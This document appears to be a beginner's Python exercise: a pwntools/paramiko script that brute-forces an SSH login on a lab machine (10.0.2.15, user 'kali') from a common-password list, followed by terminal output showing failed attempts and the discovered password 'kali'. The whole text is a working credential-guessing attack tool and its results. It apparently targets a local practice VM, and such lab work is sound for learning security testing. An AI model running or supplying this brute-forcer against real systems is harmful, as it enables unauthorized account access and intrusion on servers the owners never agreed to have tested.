___
### Input:
```
from pwn import *
import paramiko

host = "10.0.2.15"
username = "kali"
attempts = 0

with open("ssh_common_password.txt","r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts, password))
			response = ssh(host=host, user=username, password=password, timeout=1)
			if response.connected():
				print("[>] Valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1

```

### Output:
```
┌──(kali㉿kali)-[~/Desktop/Python 101]
└─$ python3 Project_1_SSH_brute.py
[0] Attempting password: '123455'!
[-] Connecting to 10.0.2.15 on port 22: Failed
[X] Invalid password!
[1] Attempting password: 'jayman'!
[-] Connecting to 10.0.2.15 on port 22: Failed
[X] Invalid password!
[2] Attempting password: 'helllo'!
[-] Connecting to 10.0.2.15 on port 22: Failed
[X] Invalid password!
[3] Attempting password: 'password'!
[-] Connecting to 10.0.2.15 on port 22: Failed
[X] Invalid password!
[4] Attempting password: 'bye '!
[-] Connecting to 10.0.2.15 on port 22: Failed
[X] Invalid password!
[5] Attempting password: 'kali'!
[+] Connecting to 10.0.2.15 on port 22: Done
[*] kali@10.0.2.15:
    Distro    Kali 2025.3
    OS:       linux
    Arch:     amd64
    Version:  6.16.8
    ASLR:     Enabled
    SHSTK:    Disabled
    IBT:      Disabled
[>] Valid password found: 'kali'!
[*] Closed connection to '10.0.2.15'

```
